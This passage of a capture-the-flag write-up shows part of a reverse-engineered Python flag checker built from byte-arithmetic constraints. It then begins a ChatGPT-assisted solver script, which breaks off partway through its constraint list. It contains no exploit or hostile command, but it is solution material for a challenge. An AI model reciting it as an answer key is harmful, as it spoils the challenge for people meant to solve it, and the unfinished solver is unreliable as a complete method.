    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">7</span><span class="p">:</span><span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">9</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span> <span class="o">!=</span> <span class="mi">6</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">9</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">9</span><span class="p">:</span><span class="mi">10</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span> <span class="o">//</span> <span class="mi">5</span> <span class="o">!=</span> <span class="mi">17</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">9</span><span class="p">:</span><span class="mi">10</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">11</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">//</span> <span class="mi">6</span> <span class="o">!=</span> <span class="mi">880</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">11</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">12</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span> <span class="o">!=</span> <span class="mi">25</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">12</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">12</span><span class="p">:</span><span class="mi">13</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span> <span class="o">**</span> <span class="mi">2</span> <span class="o">!=</span> <span class="mi">25</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">12</span><span class="p">:</span><span class="mi">13</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">13</span><span class="p">:</span><span class="mi">14</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span> <span class="o">%</span> <span class="mi">27</span> <span class="o">!=</span> <span class="mi">11</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">13</span><span class="p">:</span><span class="mi">14</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">15</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span> <span class="o">^</span> <span class="mi">72</span> <span class="o">!=</span> <span class="mi">59</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">15</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">15</span><span class="p">:</span><span class="mi">16</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">5</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">19</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">15</span><span class="p">:</span><span class="mi">16</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">17</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">7</span><span class="p">:</span><span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">41</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">17</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">9</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">75</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">19</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">12</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">3711</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">19</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">**</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">20</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">%</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">12</span><span class="p">:</span><span class="mi">13</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">41</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">20</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">20</span><span class="p">:</span><span class="mi">21</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">15</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">33</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">20</span><span class="p">:</span><span class="mi">21</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">21</span><span class="p">:</span><span class="mi">22</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">13</span><span class="p">:</span><span class="mi">14</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">7</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">21</span><span class="p">:</span><span class="mi">22</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">23</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">17</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">235</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">23</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">24</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span> <span class="o">*</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">7</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">9922</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">24</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">24</span><span class="p">:</span><span class="mi">25</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&amp;</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">21</span><span class="p">:</span><span class="mi">22</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">95</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">24</span><span class="p">:</span><span class="mi">25</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">%</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">25</span><span class="p">:</span><span class="mi">26</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">15</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">194</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">25</span><span class="p">:</span><span class="mi">26</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">26</span><span class="p">:</span><span class="mi">27</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">//</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">20</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">33</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">26</span><span class="p">:</span><span class="mi">27</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">27</span><span class="p">:</span><span class="mi">28</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">25</span><span class="p">:</span><span class="mi">26</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">177</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">27</span><span class="p">:</span><span class="mi">28</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">28</span><span class="p">:</span><span class="mi">29</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span> <span class="o">*</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'B'</span><span class="p">,</span> <span class="n">flag_bytes</span><span class="p">[</span><span class="mi">28</span><span class="p">:</span><span class="mi">29</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">29375</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">return</span> <span class="bp">True</span>
</code></pre></div></div>

<p>So, on solving the algorithm part, honestly i am terrible at math and crypto, so i had help from ChatGPT with my guidance, and cleaning up after it we arrived at the following solution</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="k">def</span> <span class="nf">solve_flag</span><span class="p">():</span>
    <span class="s">"""
    Solve the 'check_flag' constraints:
      - f[0..4] = 'f','l','a','g','{'
      - f[28]   = '}'
      - f[27]   = 'n' (from constraint #28)
      - f[i] in [32..126] for i=5..26
    Returns a list of all solutions found.
    """</span>
    <span class="c1"># Initialize the byte array with fixed values.
</span>    <span class="n">f</span> <span class="o">=</span> <span class="p">[</span><span class="bp">None</span><span class="p">]</span> <span class="o">*</span> <span class="mi">29</span>
    <span class="n">f</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="mi">102</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">123</span><span class="p">]</span>  <span class="c1"># "flag{"
</span>    <span class="n">f</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="mi">110</span>  <span class="c1"># 'n'
</span>    <span class="n">f</span><span class="p">[</span><span class="mi">28</span><span class="p">]</span> <span class="o">=</span> <span class="mi">125</span>  <span class="c1"># '}'
</span>
    <span class="n">solutions_found</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="c1"># List of constraints as pairs of (required_indices, lambda check).
</span>    <span class="n">constraints</span> <span class="o">=</span> <span class="p">[</span>
        <span class="p">([</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">],</span>       <span class="k">lambda</span><span class="p">:</span> <span class="p">((</span><span class="n">f</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="n">f</span><span class="p">[</span><span class="mi">6</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mi">63</span><span class="p">)</span> <span class="o">==</span> <span class="mi">41</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">],</span>       <span class="k">lambda</span><span class="p">:</span> <span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="n">f</span><span class="p">[</span><span class="mi">7</span><span class="p">])</span> <span class="o">==</span> <span class="mi">237</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">],</span>       <span class="k">lambda</span><span class="p">:</span> <span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="n">f</span><span class="p">[</span><span class="mi">8</span><span class="p">])</span> <span class="o">==</span> <span class="mi">12</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">],</span>       <span class="k">lambda</span><span class="p">:</span> <span class="p">((</span><span class="n">f</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">^</span> <span class="n">f</span><span class="p">[</span><span class="mi">9</span><span class="p">])</span> <span class="o">//</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">17</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">9</span><span class="p">,</span><span class="mi">10</span><span class="p">],</span>      <span class="k">lambda</span><span class="p">:</span> <span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">*</span> <span class="n">f</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">//</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">880</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">10</span><span class="p">,</span><span class="mi">11</span><span class="p">],</span>     <span class="k">lambda</span><span class="p">:</span> <span class="p">((</span><span class="n">f</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="n">f</span><span class="p">[</span><span class="mi">11</span><span class="p">])</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">25</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">11</span><span class="p">,</span><span class="mi">12</span><span class="p">],</span>     <span class="k">lambda</span><span class="p">:</span> <span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">-</span> <span class="n">f</span><span class="p">[</span><span class="mi">12</span><span class="p">])</span><span class="o">**</span><span class="mi">2</span> <span class="o">==</span> <span class="mi">25</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">12</span><span class="p">,</span><span class="mi">13</span><span class="p">],</span>     <span class="k">lambda</span><span class="p">:</span> <span class="p">((</span><span class="n">f</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">|</span> <span class="n">f</span><span class="p">[</span><span class="mi">13</span><span class="p">])</span> <span class="o">%</span> <span class="mi">27</span><span class="p">)</span> <span class="o">==</span> <span class="mi">11</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">13</span><span class="p">,</span><span class="mi">14</span><span class="p">],</span>     <span class="k">lambda</span><span class="p">:</span> <span class="p">((</span><span class="n">f</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">|</span> <span class="n">f</span><span class="p">[</span><span class="mi">14</span><span class="p">])</span> <span class="o">^</span> <span class="mi">72</span><span class="p">)</span> <span class="o">==</span> <span class="mi">59</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">14</span><span class="p">,</span><span class="mi">15</span><span class="p">],</span>     <span class="k">lambda</span><span class="p">:</span> <span class="p">((</span><span class="n">f</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">+</span> <span class="n">f</span><span class="p">[</span><span class="mi">15</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mi">123</span><span class="p">)</span> <span class="o">==</span> <span class="mi">19</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">7</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">16</span><span class="p">],</span>   <span class="k">lambda</span><span class="p">:</span> <span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">+</span> <span class="n">f</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">-</span> <span class="n">f</span><span class="p">[</span><span class="mi">7</span><span class="p">])</span> <span class="o">==</span> <span class="mi">41</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">8</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">17</span><span class="p">],</span>   <span class="k">lambda</span><span class="p">:</span> <span class="p">((</span><span class="n">f</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">^</span> <span class="n">f</span><span class="p">[</span><span class="mi">17</span><span class="p">])</span> <span class="o">-</span> <span class="n">f</span><span class="p">[</span><span class="mi">8</span><span class="p">])</span> <span class="o">==</span> <span class="o">-</span><span class="mi">75</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">11</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">18</span><span class="p">],</span>  <span class="k">lambda</span><span class="p">:</span> <span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">*</span> <span class="n">f</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">|</span> <span class="n">f</span><span class="p">[</span><span class="mi">11</span><span class="p">])</span> <span class="o">==</span> <span class="mi">3711</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">12</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">19</span><span class="p">],</span>  <span class="k">lambda</span><span class="p">:</span> <span class="n">f</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="nb">pow</span><span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">18</span><span class="p">],</span> <span class="n">f</span><span class="p">[</span><span class="mi">19</span><span class="p">],</span> <span class="n">f</span><span class="p">[</span><span class="mi">12</span><span class="p">])</span> <span class="o">==</span> <span class="mi">41</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">14</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">20</span><span class="p">],</span>  <span class="k">lambda</span><span class="p">:</span> <span class="p">((</span><span class="n">f</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">-</span> <span class="n">f</span><span class="p">[</span><span class="mi">20</span><span class="p">])</span> <span class="o">&amp;</span> <span class="n">f</span><span class="p">[</span><span class="mi">14</span><span class="p">])</span> <span class="o">==</span> <span class="mi">33</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">13</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">21</span><span class="p">],</span>  <span class="k">lambda</span><span class="p">:</span> <span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">-</span> <span class="n">f</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">+</span> <span class="n">f</span><span class="p">[</span><span class="mi">13</span><span class="p">])</span> <span class="o">==</span> <span class="mi">7</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">16</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">22</span><span class="p">],</span>  <span class="k">lambda</span><span class="p">:</span> <span class="p">((</span><span class="n">f</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">^</span> <span class="n">f</span><span class="p">[</span><span class="mi">22</span><span class="p">])</span> <span class="o">+</span> <span class="n">f</span><span class="p">[</span><span class="mi">16</span><span class="p">])</span> <span class="o">==</span> <span class="mi">235</span><span class="p">),</span>
